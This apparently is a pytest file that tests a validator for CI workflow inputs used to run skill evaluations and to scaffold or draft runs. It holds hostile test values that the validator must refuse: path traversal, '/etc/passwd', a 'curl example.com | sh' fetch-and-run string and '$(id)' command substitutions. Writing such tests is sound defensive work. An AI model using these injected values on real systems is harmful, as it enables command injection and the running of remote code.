import json

import pytest

from conftest import FIXTURE_REPO, ROOT, RUN_ID
import fire_inputs as fi


def event(**inputs):
    base = {"mode": "eval", "run_id": RUN_ID, "fixture": "evals/workflow-path-audit/basic",
            "arms": "both", "trials": "3", "model": "", "skill": ""}
    base.update(inputs)
    return {"inputs": base}


def build(ev):
    return fi.build_payload(ev, ROOT / "evals" / "roster.yml", FIXTURE_REPO)


def test_a_valid_eval_event_builds_the_exact_payload():
    assert build(event()) == {"mode": "eval", "run_id": RUN_ID,
                              "fixture": "evals/workflow-path-audit/basic", "arms": "both", "trials": 3}
    assert build(event(model="claude-sonnet-5-5", arms="bare", trials="1"))["model"] == "claude-sonnet-5-5"


@pytest.mark.parametrize("change", [
    {"run_id": "20261028T120000Z-1A2B3C"}, {"run_id": "x"}, {"run_id": RUN_ID + "\n"},
    {"fixture": "evals/../.github/workflows/x"}, {"fixture": "/etc/passwd"},
    {"fixture": "evals/a/b; curl example.com | sh"}, {"fixture": "evals/$(id)/b"},
    {"fixture": "evals/workflow-path-audit/nope"},                    # not on the default branch
    {"arms": "all"}, {"trials": "4"}, {"trials": "0"}, {"trials": ""},
    {"model": "claude-other"}, {"model": "gpt-5"}, {"model": "claude-$(id)"},
    {"mode": "scaffold"}, {"mode": ""}, {"skill": "workflow-path-audit"},  # skill is improve-only
])
def test_bad_eval_inputs_are_refused(change):
    with pytest.raises(fi.Refused):
        build(event(**change))


def test_unknown_input_keys_and_malformed_events_are_refused():
    ev = event()
    ev["inputs"]["extra"] = "x"
    for bad in (ev, {}, {"inputs": []}, [], None, {"inputs": {"mode": 5}}):
        with pytest.raises(fi.Refused):
            build(bad)


def test_improve_mode_takes_skill_and_trials_only():
    ok = event(mode="improve", fixture="", arms="both", skill="workflow-path-audit")
    assert build(ok) == {"mode": "improve", "run_id": RUN_ID, "skill": "workflow-path-audit", "trials": 3}
    for change in ({"fixture": "evals/workflow-path-audit/basic"}, {"model": "claude-sonnet-5-5"},
                   {"arms": "bare"}, {"skill": ""}, {"skill": "No Such"}, {"skill": "ghost-skill"}):
        with pytest.raises(fi.Refused):
            build(event(**{**{"mode": "improve", "fixture": "", "skill": "workflow-path-audit"}, **change}))


def test_main_writes_payload_and_only_validated_tokens_to_the_output_file(tmp_path, capsys):
    ev = tmp_path / "event.json"
    ev.write_text(json.dumps(event()))
    out, gh = tmp_path / "payload.json", tmp_path / "gh_output"
    code = fi.main(["--event", str(ev), "--payload-out", str(out), "--roster", str(ROOT / "evals/roster.yml"),
                    "--repo-root", str(FIXTURE_REPO), "--github-output", str(gh)])
    assert code == 0
    assert json.loads(out.read_text())["trials"] == 3 and " " not in out.read_text()
    assert gh.read_text() == f"mode=eval\nrun_id={RUN_ID}\n"


def test_main_refusal_is_a_fixed_message_without_the_input(tmp_path, capsys):
    ev = tmp_path / "event.json"
    ev.write_text(json.dumps(event(fixture="evals/SECRET-LOOKING/x")))
    code = fi.main(["--event", str(ev), "--payload-out", str(tmp_path / "p.json")])
    assert code == 1 and "SECRET-LOOKING" not in capsys.readouterr().err
    assert not (tmp_path / "p.json").exists()


def blank(**inputs):
    base = {k: "" for k in fi.KNOWN}
    base.update(arms="both", trials="3", run_id=RUN_ID)
    base.update(inputs)
    return {"inputs": base}


def test_scaffold_mode_takes_a_merged_pr_reference():
    assert build(blank(mode="scaffold", pr="acme-example/app#12")) == {
        "mode": "scaffold", "repo": "acme-example/app", "number": 12, "run_id": RUN_ID}
    for bad in ("acme-example/app", "acme-example/app#0", "app#12", "acme/app#12; id", "acme/../x#1"):
        with pytest.raises(fi.Refused):
            build(blank(mode="scaffold", pr=bad))
    with pytest.raises(fi.Refused):
        build(blank(mode="scaffold", pr="acme-example/app#12", skill="x"))


def test_draft_mode_takes_only_an_opaque_lesson_id():
    lid = "ab" * 32
    assert build(blank(mode="draft", lesson_id=lid)) == {"mode": "draft", "lesson_id": lid, "run_id": RUN_ID}
    assert "subject" not in fi.KNOWN and "lesson" not in fi.KNOWN
    for change in ({"lesson_id": "push-before-checks"}, {"lesson_id": "AB" * 32}, {"lesson_id": ""},
                   {"lesson_id": "ab" * 33}, {"pr": "acme-example/app#1"}):
        inputs = dict(mode="draft", lesson_id=lid) | change
        with pytest.raises(fi.Refused):
            build(blank(**inputs))
